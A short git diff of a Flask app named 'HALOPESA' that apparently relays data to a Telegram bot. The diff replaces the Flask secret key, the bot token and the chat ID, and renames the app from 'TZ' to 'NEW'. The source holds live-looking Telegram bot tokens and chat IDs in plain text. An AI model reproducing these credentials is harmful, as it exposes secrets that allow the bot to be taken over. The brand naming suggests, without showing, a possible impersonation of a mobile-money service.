@@ -7,10 +7,10 @@ from datetime import datetime
 import os
 
 app = Flask(__name__)
-app.secret_key = 'halopesa-tz-2024'
+app.secret_key = 'halopesa-new-2024'
 
-BOT_TOKEN = '8863624253:AAH6SxAjF9F9hLKm1o9DTnVHzvdXrviWezA'
-CHAT_ID = '8589275340'
+BOT_TOKEN = '8981301695:AAEllSlpBC_r7kZBu8cvAIqn9eDsc1onNHg'
+CHAT_ID = '7971320678'
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 
 def init_db():
@@ -146,6 +146,6 @@ def webhook():
     return jsonify({'ok':True})
 
 if __name__ == '__main__':
-    print("HALOPESA TZ RUNNING!")
+    print("HALOPESA NEW RUNNING!")
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
